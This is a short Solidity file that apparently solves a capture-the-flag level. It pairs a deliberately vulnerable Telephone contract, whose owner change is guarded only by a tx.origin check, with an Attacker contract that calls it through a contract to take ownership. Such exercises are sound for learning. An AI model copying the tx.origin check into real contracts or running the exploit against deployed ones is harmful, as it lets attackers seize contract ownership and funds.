//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract Attacker{
    Telephone telephone;
    function attacker(address _address) public{
        telephone = Telephone(_address);    
    }
    function attack() public{
        telephone.changeOwner(msg.sender);
    }
}